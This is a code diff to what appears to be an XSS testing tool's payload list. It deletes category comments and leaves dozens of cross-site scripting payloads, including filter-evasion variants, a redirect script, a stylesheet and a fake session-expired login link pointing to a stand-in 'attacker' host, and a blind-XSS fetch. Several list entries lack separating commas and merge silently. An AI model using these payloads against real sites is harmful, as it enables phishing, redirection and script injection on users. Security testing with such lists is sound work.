@@ -13,7 +13,6 @@ XSS_PAYLOADS = [
     "<a href='javascript:alert(1)'>Click Here</a>",
     "<input autofocus onfocus=alert('XSS')>",
     "<img src='x' onerror='alert(1)'>",
-        # Simple Reflected XSS Payload
     "<script>alert('XSS')</script>",
     "<img src='x' onerror='alert(1)'>",
     "<script>alert('XSS')</script>",
@@ -31,18 +30,14 @@ XSS_PAYLOADS = [
     "<iframe src='javascript:alert(1)'></iframe>",
     "<form action='javascript:alert(1)'></form>"
     "'-prompt(8)-'"   
-    # WAF Bypass XSS Payloads
     "<img src='x' onerror='alert(1)'>",
     "<img src=1 onerror=confirm(1)>",
     "<svg/onload=alert(1)>",
     "<a href=javascript:confirm('XSS')>Click me</a>", 
-    # DOM-based XSS Payloads
     "<img src=x onerror=alert('DOM-XSS')>",
     "<input autofocus onfocus=alert('DOM-XSS')>",
     
-    # Base64 Encoded Payloads (WAF Bypass)
     "<img src='data:image/svg+xml;base64,PHN2ZyBvbm1vZGlmaWVkZXZhbGVyY2hpc3Q9Ilxpc3N1Zz4=' onerror=alert('XSS')>",
-    # Bypass by Character Encoding
     "<script>%61lert('XSS')</script>",  # %61 is 'a' in hex
     "<script>eval('aler'+'t(1)')</script>",
     "<div>`-alert(1)</script><script>`</div>"
@@ -53,10 +48,7 @@ XSS_PAYLOADS = [
     "<script>location.href=decodeURIComponent(location.hash.slice(1));</script>"
     "<link rel=stylesheet href=//attacker/test.css>"
     "<a href=https://attacker/>Session expired. Please login again.</a>"
-    # Reflected Blind XSS Payloads
     "<script>fetch('/log', {method: 'POST', body: 'XSS'})</script>",  # Using a server endpoint for Blind XSS
-
-    # Add more payloads for bypassing WAF
 ]
 
 # Function to test for reflected XSS
